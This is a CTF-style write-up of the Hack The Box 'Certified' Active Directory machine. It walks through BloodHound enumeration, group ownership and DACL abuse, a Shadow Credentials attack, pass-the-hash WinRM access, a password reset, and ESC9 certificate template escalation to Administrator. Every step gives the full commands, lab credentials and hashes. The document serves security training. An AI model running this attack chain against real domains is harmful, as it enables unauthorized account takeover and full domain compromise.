---
title: certified
published: 2025-03-08
description: ''
image: ''
tags: []
category: ''
draft: true 
lang: ''
---

# enumeration

## port scanning
```bash
nmap -sC -sV -Pn -oA certified 10.10.11.41

Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-18 06:16:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-12-18T06:18:16+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-12-18T06:18:15+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-18T06:18:16+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-18T06:18:15+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-18T06:17:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

we see that the the domain name is `certified.htb` and the DC is `dc01.certified.htb` 

## AD enumeration

we are given some credentials so lets run bloodhound python  

```bash
bloodhound-python -u 'judith.mader' -p 'judith09' -ns 10.10.11.41 -d certified.htb -c all
```

opening the data in bloodhound-gui and try to find the shortest path with 'find shortest path from owned principals' query
![](src/assets/certified/Certified_image_1.png)

# Exploitation

the plan here is clear:
* we abuse `GeneralWrite` on the `MANAGEMENT` group and add our self to that group
* since we are members of `MANAGEMENT` group we have `GenericWrite` on the `MANAGEMENT_SVC` user
* `MANAGEMENT_SVC` have CanPSRemote right which means we can connect using winrm 

## from judith to MANAGEMENT group

`judith` have WriteOwner right on the MANAGEMENT group so we can add our self to this group by being its owner 

#### change ownership
```bash
owneredit.py -action write -new-owner 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```

```
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!

```

#### Modifying the rights
we give our self the right to add members

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```

```bash
[*] DACL backed up to dacledit-20241221-123940.bak
[*] DACL modified successfully!
```

#### Now we add `judith` to that group
```bash
net rpc group addmem "MANAGEMENT" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

## From MANAGEMENT group to management_svc user

because the envirement have PKINT and the MANAGEMENT group members have `GenericWrite` we can abuse `Shadow Credentiels` attack, i've explained here [[Active directory/Shadow credentiels|Shadow credentiels]]

#### we set the `msDS-KeyCredentialLink` to a public key we have its private key

```bash
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --verbose
```

```bash
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e197addf-0fda-e01f-42d5-a8040aa01029
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[VERBOSE] No filename was provided. The certificate(s) will be stored with the filename: 7YEeNBnq
[VERBOSE] No pass was provided. The certificate will be stored with the password: qSBdiOLRJXQo59IA67hp
[+] Saved PFX (#PKCS12) certificate & key at path: 7YEeNBnq.pfx
[*] Must be used with password: qSBdiOLRJXQo59IA67hp
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[VERBOSE] Run the following command to obtain a TGT
[VERBOSE] python3 PKINITtools/gettgtpkinit.py -cert-pfx 7YEeNBnq.pfx -pfx-pass qSBdiOLRJXQo59IA67hp certified.htb/management_svc 7YEeNBnq.ccache
```

#### Next we get the session secret
in order to decrypt data exchanged with the KDC we  need to find the session secret
```bash
python3 ~/work/tools/PKINITtools/gettgtpkinit.py -cert-pfx 7YEeNBnq.pfx -pfx-pass qSBdiOLRJXQo59IA67hp certified.htb/management_svc 7YEeNBnq.ccache
```

```bash
2024-12-21 19:54:39,002 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-12-21 19:54:39,025 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-12-21 19:54:41,924 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-12-21 19:54:41,924 minikerberos INFO     5144a65e87fa07e2383cb18ff8ff4b003dd1deb832b63e1a9e209efaa0a728db
INFO:minikerberos:5144a65e87fa07e2383cb18ff8ff4b003dd1deb832b63e1a9e209efaa0a728db
2024-12-21 19:54:41,929 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### use the U2U service to retrieve our user's hash

first lets disable the password protection because certipy does not support that
```bash
certipy cert -export -pfx "7YEeNBnq.pfx" -password "qSBdiOLRJXQo59IA67hp" -out unprotected_pfx.pfx
```

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'unprotected_pfx.pfx'
```

now lets retrieve the NTLM hash
```bash
certipy auth -pfx unprotected_pfx.pfx -username "management_svc" -domain "certified.htb"
```

```bash
[!] Could not find identification in the provided certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
```

now we have `management_svc` hash, we can use it with `evil-winrm` to get a shell

```bash
evil-winrm -i 10.10.11.41 -u 'management_svc'  -H 'a091c1832bcdd4677c28b5a6a1295584'
```
and get the user flag


# Privileges escalation
![](src/assets/certified/Certified_image_2.png)

the user `management_svc` have `GenericAll` rights on the `ca_operator` and from its name it seems to be a user who have something to do with ADCS

with `GenericAll` rights we can change `ca_operator`'s password

## Change `ca_operator`'s password
in our evil-winrm session:
```bash
*Evil-WinRM* PS C:\Users\management_svc\Documents> $UserPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force

*Evil-WinRM* PS C:\Users\management_svc\Documents> . ./powerview.ps1

*Evil-WinRM* PS C:\Users\management_svc\Documents> Set-DomainUserPassword -Identity ca_operator -AccountPassword $UserPassword 
```

now `ca_operator` have the password `password123`
verify with:

```bash
netexec smb 10.10.11.41 -u 'ca_operator' -p password123

SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:password123 
```

## Exploiting template configurations

since we are in an ADCS environment it make sense to use certipy
```bash
certipy find -u ca_operator@certified.htb -p password123 -dc-ip 10.10.11.41 -stdout -vulnerable -debug

```

output:

```
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA

....

    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

indeed the template `CertifiedAuthentication` is vulnerable to `ESC9` 

following the steps from https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation?fallback=true#abuse-scenario we can get the administrator NTLM hash

```bash
certipy shadow auto -username management_svc@certified.htb -hashes aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
```

![](src/assets/certified/Certified_image_3.png)


```bash
certipy account update -username management_svc@certified.htb -hashes aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

![](src/assets/certified/Certified_image_4.png)

```bash
certipy req -username ca_operator@certified.htb -hashes a9fdfa038c4b75ebc76dc855dd74f0da -ca certified-dc01-ca -template CertifiedAuthentication
```

![](src/assets/certified/Certified_image_5.png)

```bash
certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

![](src/assets/certified/Certified_image_6.png)

```bash
certipy auth -pfx administrator.pfx -domain certified.htb
```
![](src/assets/certified/Certified_image_7.png)


Now we can connect with evil-winrm using administrator NTLM hash

```bash
evil-winrm -i 10.10.11.41 -u 'administrator'  -H '0d5b49608bbce1751f708748f67e2d34' 
```


and then get the administrator flag